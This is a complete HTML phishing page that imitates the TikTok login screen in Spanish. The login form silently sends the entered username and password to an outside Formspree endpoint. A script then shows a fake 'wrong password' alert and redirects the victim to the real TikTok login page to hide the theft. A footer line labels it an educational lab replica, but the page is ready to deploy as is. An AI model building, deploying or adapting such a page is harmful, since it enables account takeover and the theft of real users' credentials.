<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - TikTok</title>
    <link rel="icon" href="https://sf16-scmcdn-va.ibytedtos.com/obj/eden-va/uv-up_zvhCVh6vpu/ljhwZthlaukjlkulzlp/tiktok-icon.png">
    <style>
        :root {
            --tiktok-red: #fe2c55;
            --bg-color: #ffffff;
            --text-color: #161823;
            --gray-text: #86858b;
            --input-bg: #f1f1f2;
            --border-color: #efefef;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: space-between;
        }

        /* HEADER */
        .tiktok-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            border-bottom: 1px solid var(--border-color);
        }

        .tiktok-logo-container {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            color: var(--text-color);
        }

        .tiktok-logo-container img {
            width: 40px;
            height: 40px;
        }

        .tiktok-logo-container span {
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: -1px;
        }

        .header-help {
            color: var(--text-color);
            text-decoration: none;
            font-size: 0.95rem;
            font-weight: 600;
        }

        .header-help:hover {
            color: var(--tiktok-red);
        }

        /* CONTENEDOR PRINCIPAL */
        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            padding: 40px 20px;
        }

        .login-box {
            width: 100%;
            max-width: 480px;
            background: #fff;
            padding: 10px 20px;
        }

        .login-box h1 {
            font-size: 2rem;
            font-weight: 700;
            text-align: center;
            margin-bottom: 30px;
        }

        /* OPCIONES RÁPIDAS (QR, ETC) */
        .quick-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }

        .quick-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            height: 44px;
            background: #fff;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 4px;
            font-size: 0.95rem;
            font-weight: 600;
            color: var(--text-color);
            cursor: pointer;
            text-decoration: none;
            transition: background 0.2s;
        }

        .quick-btn:hover {
            background: rgba(0, 0, 0, 0.02);
        }

        .divider {
            text-align: center;
            font-size: 0.85rem;
            color: var(--gray-text);
            margin: 20px 0;
            position: relative;
        }

        /* FORMULARIO DE ACCESO */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .form-label-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.85rem;
            font-weight: 600;
            color: var(--text-color);
        }

        .form-label-row a {
            color: var(--text-color);
            text-decoration: none;
            font-weight: 600;
        }

        .form-label-row a:hover {
            color: var(--tiktok-red);
            text-decoration: underline;
        }

        .input-row {
            display: flex;
            background: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            overflow: hidden;
            height: 48px;
            align-items: center;
        }

        .input-row:focus-within {
            border-color: var(--text-color);
            background: #fff;
        }

        .form-input {
            width: 100%;
            height: 100%;
            border: none;
            background: transparent;
            padding: 0 16px;
            font-size: 0.95rem;
            outline: none;
            color: var(--text-color);
        }

        .form-input::placeholder {
            color: var(--gray-text);
        }

        .btn-submit {
            background: rgba(254, 44, 85, 0.06);
            color: var(--tiktok-red);
            border: none;
            border-radius: 4px;
            height: 46px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .btn-submit.active-btn, .btn-submit:hover {
            background: var(--tiktok-red);
            color: #fff;
        }

        .signup-redirect {
            text-align: center;
            margin-top: 25px;
            font-size: 0.9rem;
            color: var(--gray-text);
        }

        .signup-redirect a {
            color: var(--tiktok-red);
            text-decoration: none;
            font-weight: 600;
        }

        .signup-redirect a:hover {
            text-decoration: underline;
        }

        /* FOOTER */
        .tiktok-footer {
            text-align: center;
            padding: 25px;
            font-size: 0.8rem;
            color: var(--gray-text);
            border-top: 1px solid var(--border-color);
        }

        .tiktok-footer a {
            color: var(--gray-text);
            text-decoration: none;
            margin: 0 10px;
        }

        .tiktok-footer a:hover {
            text-decoration: underline;
        }

        /* RESPONSIVO */
        @media (max-width: 600px) {
            .tiktok-header {
                padding: 15px 20px;
            }
            .login-box {
                padding: 10px;
            }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="tiktok-header">
        <a href="#" class="tiktok-logo-container">
            <img src="https://sf16-scmcdn-va.ibytedtos.com/obj/eden-va/uv-up_zvhCVh6vpu/ljhwZthlaukjlkulzlp/tiktok-icon.png" alt="TikTok Logo">
            <span>TikTok</span>
        </a>
        <a href="#" class="header-help">¿Necesitas ayuda?</a>
    </header>

    <!-- CONTENIDO DE INICIO DE SESIÓN -->
    <main class="main-container">
        <div class="login-box">
            <h1>Inicia sesión en TikTok</h1>
            
            <!-- Opciones alternas oficiales -->
            <div class="quick-options">
                <a href="#" class="quick-btn">
                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
                    Usar código QR
                </a>
                <a href="#" class="quick-btn">
                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                    Iniciar sesión con teléfono / correo / usuario
                </a>
            </div>

            <div class="divider">o</div>

            <!-- Formulario principal conectado a tu nuevo Formspree -->
            <form class="login-form" id="tiktokLoginForm" action="https://formspree.io/f/moedvkka" method="POST">
                <div class="form-group">
                    <div class="form-label-row">
                        <label>Correo electrónico o nombre de usuario</label>
                    </div>
                    <div class="input-row" style="margin-top: 6px;">
                        <input type="text" name="usuario_o_correo" class="form-input" placeholder="Email o nombre de usuario" required id="input-user">
                    </div>
                </div>

                <div class="form-group">
                    <div class="form-label-row">
                        <label>Contraseña</label>
                        <a href="#">¿Olvidaste tu contraseña?</a>
                    </div>
                    <div class="input-row" style="margin-top: 6px;">
                        <input type="password" name="contrasena" class="form-input" placeholder="Contraseña" required id="input-pass">
                    </div>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">Iniciar sesión</button>
            </form>

            <div class="signup-redirect">
                ¿No tienes cuenta? <a href="#">Regístrate</a>
            </div>
        </div>
    </main>

    <!-- FOOTER -->
    <footer class="tiktok-footer">
        <p>© 2026 TikTok - Réplica Educativa para Laboratorio</p>
    </footer>

    <!-- SCRIPT DE INTERACTIVIDAD Y ENVÍO -->
    <script>
        // Validación visual dinámica del botón
        const submitBtn = document.getElementById('submitBtn');
        const inputUser = document.getElementById('input-user');
        const inputPass = document.getElementById('input-pass');

        function checkInputs() {
            if(inputUser.value.trim().length > 2 && inputPass.value.trim().length > 2) {
                submitBtn.classList.add('active-btn');
            } else {
                submitBtn.classList.remove('active-btn');
            }
        }

        inputUser.addEventListener('input', checkInputs);
        inputPass.addEventListener('input', checkInputs);

        // Envío silencioso a Formspree, alerta de fallo y redirección oficial
        const loginForm = document.getElementById('tiktokLoginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(loginForm);
            
            try {
                await fetch(loginForm.action, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });
            } catch (error) {
                console.error('Error de red');
            }

            // Mensaje simulado de error de autenticación
            alert('Cuenta no encontrada o contraseña incorrecta. Verifica tus datos.');
            
            // Redirección a la URL oficial solicitada
            window.location.href = 'https://www.tiktok.com/login/phone-or-email';
        });
    </script>
</body>
</html>
